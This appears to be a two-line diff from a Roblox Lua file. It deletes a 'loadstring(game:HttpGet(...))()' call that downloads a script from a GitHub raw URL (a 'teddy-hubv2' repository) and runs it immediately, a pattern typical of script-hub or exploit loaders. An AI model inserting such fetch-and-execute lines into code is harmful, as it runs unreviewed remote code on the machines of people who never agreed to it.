@@ -1,2 +1,0 @@
-return
-loadstring(game:HttpGet("https://raw.githubusercontent.com/teddy-hubv2/Teddy/refs/heads/main/Pull"))()
